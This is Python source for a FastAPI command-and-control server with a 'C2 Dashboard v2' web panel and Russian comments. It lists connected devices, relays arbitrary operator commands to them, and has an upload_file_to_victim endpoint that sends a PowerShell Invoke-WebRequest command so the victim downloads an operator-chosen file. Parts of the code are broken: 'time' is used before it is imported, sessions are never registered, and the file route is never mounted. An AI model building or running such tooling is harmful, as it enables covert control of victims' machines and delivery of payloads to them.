import os
import uuid
import asyncio
from fastapi import FastAPI, WebSocket, UploadFile, File, Form
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from typing import Dict, Any

app = FastAPI()

# Хранилище сессий
sessions: Dict[str, dict] = {}

# Папка для файлов
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

class Command(BaseModel):
    session_id: str
    command: str

@app.get("/", response_class=HTMLResponse)
async def dashboard():
    return """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <title>C2 Dashboard v2</title>
        <style>
            body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; margin: 0; padding: 0; display: flex; height: 100vh; overflow: hidden; }
            .sidebar { width: 250px; background: #161b22; border-right: 1px solid #30363d; display: flex; flex-direction: column; }
            .sidebar h2 { padding: 20px; margin: 0; background: #21262d; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
            .device-list { flex-grow: 1; overflow-y: auto; }
            .device-item { padding: 15px; cursor: pointer; border-bottom: 1px solid #30363d; transition: 0.2s; display: flex; align-items: center; gap: 10px; }
            .device-item:hover { background: #21262d; }
            .device-item.active { background: #1f6feb; color: white; }
            .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #238636; }
            .main { flex-grow: 1; display: flex; flex-direction: column; padding: 20px; }
            .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
            .console-area { flex-grow: 1; background: #010409; border: 1px solid #30363d; border-radius: 6px; padding: 10px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 13px; margin-bottom: 15px; }
            .input-area { display: flex; gap: 10px; }
            input[type="text"] { flex-grow: 1; background: #0d1117; border: 1px solid #30363d; color: white; padding: 10px; border-radius: 6px; }
            button { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; }
            button:hover { background: #2ea043; }
            .log-line { margin: 2px 0; word-break: break-all; border-bottom: 1px solid #21262d; padding: 2px 0; }
            .cmd-prefix { color: #58a6ff; font-weight: bold; }
            .output-prefix { color: #8b949e; }
            .error { color: #f85149; }
            .success { color: #3fb950; }
            .upload-btn { background: #1f6feb; }
        </style>
    </head>
    <body>
        <div class="sidebar">
            <h2>Devices (<span id="count">0</span>)</h2>
            <div class="device-list" id="deviceList"></div>
        </div>
        <div class="main">
            <div class="header">
                <h3 id="currentSession">Select a device</h3>
                <button onclick="refreshList()" style="background:#30363d;">Refresh</button>
            </div>
            <div class="console-area" id="console"></div>
            <div class="input-area">
                <input type="text" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter') sendCmd()">
                <button onclick="sendCmd()">Run</button>
                <button class="upload-btn" onclick="document.getElementById('fileInput').click()">Upload File</button>
                <input type="file" id="fileInput" style="display:none" onchange="uploadFile()">
            </div>
        </div>

        <script>
            let currentSessionId = null;
            let ws = null;

            function log(msg, type = 'info') {
                const c = document.getElementById('console');
                const d = document.createElement('div');
                d.className = 'log-line ' + type;
                d.innerHTML = `<span class="${type === 'cmd' ? 'cmd-prefix' : 'output-prefix'}">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
                c.appendChild(d);
                c.scrollTop = c.scrollHeight;
            }

            function updateUI() {
                fetch('/sessions')
                    .then(r => r.json())
                    .then(ids => {
                        document.getElementById('count').innerText = ids.length;
                        const list = document.getElementById('deviceList');
                        list.innerHTML = '';
                        ids.forEach(id => {
                            const div = document.createElement('div');
                            div.className = 'device-item' + (id === currentSessionId ? ' active' : '');
                            div.innerHTML = `<div class="status-dot"></div> ID: ${id.slice(0, 8)}`;
                            div.onclick = () => connectWS(id);
                            list.appendChild(div);
                        });
                    });
            }

            function connectWS(sessionId) {
                if (ws) ws.close();
                const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
                ws = new WebSocket(`${protocol}://${window.location.host}/ws/${sessionId}`);
                
                ws.onopen = () => {
                    log(`Connected to ${sessionId}`, 'success');
                    currentSessionId = sessionId;
                    document.getElementById('currentSession').innerText = sessionId;
                    updateUI();
                };
                ws.onmessage = (event) => {
                    // Если приходит ответ на команду
                    try {
                        const data = JSON.parse(event.data);
                        if(data.output) log(data.output);
                    } catch(e) {
                        log(event.data);
                    }
                };
                ws.onclose = () => {
                    log('Disconnected', 'error');
                    currentSessionId = null;
                    updateUI();
                };
            }

            function sendCmd() {
                const cmd = document.getElementById('cmdInput').value;
                if (!cmd || !currentSessionId) return;
                
                log(cmd, 'cmd');
                fetch('/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: currentSessionId, command: cmd})
                }).catch(() => log("Failed to send", "error"));
                
                document.getElementById('cmdInput').value = '';
            }

            async function uploadFile() {
                const fileInput = document.getElementById('fileInput');
                const file = fileInput.files[0];
                if (!file || !currentSessionId) return;

                const formData = new FormData();
                formData.append('file', file);
                
                try {
                    const res = await fetch(`/upload/${currentSessionId}`, {method: 'POST', body: formData});
                    const data = await res.json();
                    log(data.message || data.detail, data.ok ? 'success' : 'error');
                } catch (e) {
                    log('Upload failed', 'error');
                }
            }

            function refreshList() {
                updateUI();
                log("List refreshed");
            }

            // Auto-refresh list every 5 seconds
            setInterval(updateUI, 5000);
            updateUI();
        </script>
    </body>
    </html>
    """

@app.websocket("/ws/{session_id}")
async def websocket_endpoint(websocket: WebSocket, session_id: str):
    await websocket.accept()
    sessions[session_id]["ws"] = websocket
    sessions[session_id]["last_seen"] = time.time()
    
    try:
        while True:
            data = await websocket.receive_text()
            # Можно добавить логику обработки входящих данных от жертвы
    except Exception:
        pass
    finally:
        if session_id in sessions:
            del sessions[session_id]

@app.post("/cmd")
async def execute_command(cmd_data: Command):
    session_id = cmd_data.session_id
    if session_id not in sessions:
        return {"status": "error", "message": "Session not found"}
    
    ws = sessions[session_id].get("ws")
    if ws:
        await ws.send_text(f"CMD:{cmd_data.command}")
        return {"status": "ok"}
    return {"status": "error", "message": "Connection lost"}

@app.post("/upload/{session_id}")
async def upload_file_to_victim(session_id: str, file: UploadFile = File(...)):
    if session_id not in sessions:
        return {"status": "error", "message": "Session not found"}
    
    file_path = os.path.join(UPLOAD_DIR, file.filename)
    with open(file_path, "wb") as buffer:
        buffer.write(await file.read())
        
    download_url = f"http://{app.state.app_host or 'localhost'}:8000/files/{file.filename}"
    
    ws = sessions[session_id].get("ws")
    if ws:
        cmd = f"powershell -c Invoke-WebRequest -Uri '{download_url}' -OutFile '%TEMP%\\{file.filename}'"
        await ws.send_text(f"FILE_CMD:{cmd}")
        return {"status": "ok", "message": f"Command sent to download {file.filename}"}
    
    return {"status": "error", "message": "Connection lost"}

@app.get("/sessions")
async def get_sessions():
    return list(sessions.keys())

if __name__ == "__main__":
    import uvicorn
    import time
    uvicorn.run(app, host="0.0.0.0", port=8000)
